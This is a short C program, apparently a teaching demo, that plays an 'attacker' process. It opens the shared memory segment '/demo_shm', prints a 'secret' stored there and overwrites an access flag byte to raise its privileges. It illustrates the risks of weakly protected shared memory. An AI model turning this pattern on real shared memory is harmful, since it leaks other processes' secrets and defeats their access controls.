#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
 
#define SIZE 256
 
int main() {
    sleep(2); // wait for victim
 
    int shm_fd = shm_open("/demo_shm", O_RDWR, 0666);
    char *memory = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
 
    printf("Attacker: Reading secret...\n");
    printf("Leaked: %s\n", &memory[100]);
 
    printf("Attacker: Modifying access flag...\n");
    memory[50] = 1;
 
    return 0;
}